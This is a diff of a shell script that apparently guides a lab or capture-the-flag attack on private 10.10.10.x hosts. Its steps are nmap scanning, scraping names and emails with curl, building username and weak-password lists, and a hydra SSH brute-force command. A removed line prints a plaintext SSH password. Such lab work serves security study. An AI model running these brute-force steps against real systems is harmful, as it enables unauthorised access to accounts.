@@ -16,8 +16,8 @@ nmap -sC -sV 10.10.10.2 10.10.10.10 10.10.10.11 10.10.10.12 10.10.10.13
 echo ""
 
 echo "[+] Step 3: Web Enumeration"
-echo "curl -s http://10.10.10.12 | grep -E '(Name|Email)'"
-curl -s http://10.10.10.12 | grep -E '(Name|Email)'"
+echo "curl -s http://10.10.10.10 | grep -E '(Name|Email)'"
+curl -s http://10.10.10.10 | grep -E '(Name|Email)'
 echo ""
 
 echo "[+] Step 4: Generate Username List"
@@ -62,6 +62,6 @@ echo "Created passwords.txt with common weak passwords"
 echo ""
 echo "=== Ready for Exploitation ==="
 echo "Next steps:"
-echo "1. FTP enumeration: ftp 10.10.10.11"
-echo "2. SSH brute force: hydra -L users.txt -P passwords.txt 10.10.10.10 ssh"
-echo "3. SSH access: ssh aadams@10.10.10.10 (password: nostaw)"
+echo "1. FTP enumeration: ftp 10.10.10.12"
+echo "2. SSH brute force: hydra -L users.txt -P passwords.txt 10.10.10.11 ssh"
+echo "3. SSH access: ssh aadams@10.10.10.11 (password: <password>)"
